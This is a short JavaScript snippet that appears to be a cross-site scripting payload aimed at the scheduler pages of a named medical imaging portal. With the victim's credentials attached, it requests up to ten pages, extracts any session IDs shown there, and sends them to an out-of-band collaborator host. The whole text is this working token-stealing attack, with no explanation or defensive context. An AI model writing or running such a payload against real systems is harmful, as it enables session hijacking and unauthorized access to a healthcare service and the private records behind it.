(function(){
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cContext=Context_29',{credentials:'include'})
.then(r=>r.text())
.then(t=>{
let m=t.match(/<A\s+href="JavaScript:\s*redirPage_eP\('\/scheduler\/valueSelectorPopupTable\.jsp\?cPage=(\d+)'\)">Last<\/a>/i);
if(m){
let l=parseInt(m[1],10);
for(let p=l;p>l-10;p--){
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage='+p+'&cContext=Context_28',{credentials:'include'})
.then(r=>r.text())
.then(t=>{
let s=t.match(/logged in; session ID:\s*([^;]+);/i);
if(s) fetch('https://288txy69u88zcpjq6tg9h8l74yapyh25r.oastify.com?s='+encodeURIComponent(s[1].trim()),{mode:'no-cors'});
});
}
}
});
})();